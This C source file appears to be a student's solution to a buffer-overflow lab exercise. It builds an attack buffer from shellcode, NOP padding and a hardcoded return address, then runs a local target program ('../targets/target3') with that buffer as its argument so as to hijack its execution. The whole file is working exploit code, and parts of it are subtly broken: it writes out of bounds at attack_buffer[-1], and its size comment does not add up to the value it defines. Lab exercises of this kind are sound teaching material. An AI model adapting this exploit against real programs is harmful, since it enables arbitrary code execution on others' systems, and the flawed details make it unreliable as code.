#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define BUFF_ADDR 0x40a4fe40
#define ATTACK_SIZE 81 // 88(distance from return to buffer) - 67(size of buffer) + 8(size of return) + 1

int
main ( int argc, char * argv[] )
{
    char *    args[3];
    char *    env[1];

    // Copy the shell code into a env buffer, name it EGG as in the paper
    // char *env_buffer = (char*)malloc(strlen(shellcode)+5);
    // memcpy(env_buffer, "EGG=", 4);
    // int i;
    // for (i = 0; i < strlen(shellcode); ++i) {
    //     env_buffer[i+4] = shellcode[i];
    // }
    // shellcode[-1] = '\0';

    // Write the attack buffer, fill with NOP and address of env variables
    char *attack_buffer = (char*)malloc(ATTACK_SIZE);
    int i;
    for (i = 0; i < strlen(shellcode); ++i) {
        attack_buffer[i] = shellcode[i];
    }
    for (; i < ATTACK_SIZE-5; ++i) {
        attack_buffer[i] = 0x90;
    }
    int *ptr = (int*)(attack_buffer+i);
    *ptr = BUFF_ADDR;
    attack_buffer[-1] = '\0';

    args[0] = TARGET;
    args[1] = attack_buffer;
    args[2] = NULL;
    env[0] = NULL;

    if ( execve (TARGET, args, env) < 0 )
        fprintf (stderr, "execve failed.\n");

    return (0);
}
